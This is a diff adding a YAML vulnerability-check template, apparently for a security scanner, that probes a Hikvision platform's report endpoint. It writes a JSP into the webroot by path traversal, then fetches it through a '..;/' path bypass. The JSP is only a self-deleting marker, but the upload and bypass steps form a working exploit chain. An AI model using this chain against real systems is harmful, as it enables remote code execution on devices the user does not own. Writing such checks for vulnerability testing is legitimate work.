@@ -1,0 +1,28 @@
+name: hikvision-anfang-report-fileupload
+set:
+  r1: randomLowercase(4)
+  r2: randomInt(40000, 44800)
+  r3: randomInt(40000, 44800)
+  rboundary: randomLowercase(8)
+rules:
+  - method: GET
+    path: "/svm/api/external/report"
+    headers: 
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/{{r1}}.jsp\"\r\n\
+        Content-Type: application/zip\r\n\
+        \r\n\
+        <%out.print({{r2}} * {{r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
+        \r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: |
+      response.status == 200 && response.body.bcontains(b'"code":') && response.body.bcontains(b'"data":') && response.body.bcontains(b'"msg":')
+  - method: GET
+    path: "/portal/ui/login/..;/..;/{{r1}}.jsp"
+    expression: |
+      response.status == 200  && response.body.bcontains(bytes(string(r2 * r3)))
+detail:
+  author: 666
